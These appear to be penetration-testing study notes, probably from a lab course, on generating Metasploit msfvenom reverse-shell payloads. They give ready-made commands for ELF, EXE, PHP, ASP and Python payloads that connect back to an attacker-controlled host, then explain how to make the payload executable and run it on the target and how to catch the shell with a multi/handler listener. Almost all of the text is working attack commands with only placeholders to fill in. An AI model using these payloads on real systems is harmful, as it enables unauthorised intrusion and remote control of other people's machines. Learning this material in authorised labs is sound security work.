# Other Payloads

- Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. 

- Below are a few examples you will often use:

## 1. Linux Executable and Linkable Format (elf)

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
```

- The `.elf` format is comparable to the `.exe` format in Windows. These are ***executable files*** for ***Linux***. 

- However, you may still need to make sure they have executable permissions on the target machine. 

- For example, once you have the `shell.elf` file on your target machine, use the `chmod +x shell.elf` command to accord executable permissions. 

- Once done, you can ***run*** this file by typing `./shell.elf` on the target machine command line.

## 2. Windows

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```

## 3. PHP

```
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```

## 4. ASP

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```

## 5. Python

```
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```

#

- In all the above examples, `LHOST` will be the `IP address` of your ***attacking machine***, and `LPORT` will be the port on which your ***handler*** will listen. 

- All of the examples above are `reverse payloads`. 

- This means you will need to have the `exploit/multi/handler` module listening on your attacking machine to work as a handler. 

- You will need to set up the handler accordingly with the payload, `LHOST` and `LPORT` parameters. 
These values will be the same you have used when ***creating the msfvenom payload***.



